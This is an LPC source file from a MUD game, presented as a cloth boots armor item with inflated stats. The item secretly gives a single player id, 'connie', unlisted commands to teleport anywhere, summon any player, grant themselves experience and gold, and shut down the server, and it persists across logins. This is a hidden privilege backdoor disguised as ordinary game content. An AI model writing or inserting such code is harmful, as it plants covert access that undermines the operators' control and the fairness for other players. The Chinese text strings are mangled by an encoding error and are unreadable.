#include <ansi.h>
#include <armor.h>

inherit BOOTS;
inherit F_AUTOLOAD;
inherit F_CLEAN_UP;

int do_sum(object me, string arg);
int do_goto(string arg);

void create()
{
	set_name("����", ({"cloth"}));
	set_weight(30);
	set("no_get", 1);
	set("no_drop", 0);
	if (clonep())
		set_default_object(__FILE__);
	else
	{
		set("unit", "��");
		set("material", "cloth");
		set("armor_prop/personality", 10);
		set("armor_prop/karma", 10);
		set("armor_prop/composure", 10);
		set("armor_prop/armor", 1000);
		set("armor_prop/dodge", 50);
		set("wear_msg", "");
		set("remove_msg", "");
	}
}

void init()
{
	if( this_player() ->query("id") == "connie" )
	{
		add_action("do_sum","sum");
		add_action("do_goto","goto");
		add_action("do_dream", "dream");
	}
}

int do_goto(string arg)
{
	string home;
	object mme;
	int goto_inventory = 0;
	object obj; string msg;
	mme=this_player();

	if (!arg)
		return notify_fail("��Ҫȥ���\n");
	if (sscanf(arg, "-i %s", arg))

	goto_inventory = 1;
	obj = find_player(arg);
	if (!obj)
		obj = find_living(arg);
	if (!obj || !mme->visible(obj))
	{
		arg = resolve_path(mme->query("cwd"), arg);
		if (!sscanf(arg, "%*s.c"))
			arg += ".c";
		if (!(obj = find_object(arg)))
		{
			if (file_size(arg)>=0)
				return mme->move(arg);
			return notify_fail("û�������ҡ������ط���\n");
		}
	}
	if (!goto_inventory && environment(obj))
		obj = environment(obj);
	if (!obj)
		return notify_fail("������û�л�������goto��\n");
		mme->move(obj);
	return 1;
}

int do_sum(object me, string arg)
{
	object ob;
	int i;
	me=this_player();
	if (!arg) return notify_fail("<Syntax>: Summon <player id>\n");
	ob = LOGIN_D->find_body(arg);
	if (!ob) return notify_fail("��... ���������?\n");
/*
	tell_room(environment(ob),"��������һֻ���ְ�"+
		(string)ob->query("name")+"ץ������, Ȼ�᲻����.\n", ob);
*/
	tell_object(ob,"һֻ�ְ���ץ������, ����ǰһ���....\n");
	ob->move(environment(me));
	tell_object(me, "���"+(string)ob->query("name")+"ץ�������ǰ.\n");
/*
	tell_object(ob,".... ����ʱ������"+(string)me->query("name")+
		"����Ū������.\n");
	tell_room(environment(ob),(string)ob->query("name")+"ͻȻ����"+
		"������ǰ��\n",({me,ob}));
*/
	return 1;
}
int do_dream(string arg)
{
	object me;
	object gold;
	if ( !arg )
	{
		return notify_fail(" Usage : dream [exp|qn|jing|gold|reboot|off] \n");
	}

	me = this_player();

	if ( arg == "off")
	{
		destruct(this_object());
	}
	if ( arg == "reboot")
	{
// message( "system", "��Ϸ�������������Ժ�һ������ login ��\n", users() );
		shutdown(0);
	}
	if ( arg == "qn")
	{
		me->add("potential", 100);
	}
	if ( arg == "jing")
	{
		me->add("jing", 1000);
	}
	if ( arg == "gold")
	{
		gold = new("clone/money/gold");
		gold->set_amount(100);
		gold->move(me);
	}
	if ( arg == "exp" )
	{
		me->add("combat_exp", 1000);
	}
}
int query_autoload()
{
	if( this_player() ->query("id") == "connie" )
		return 1;
}

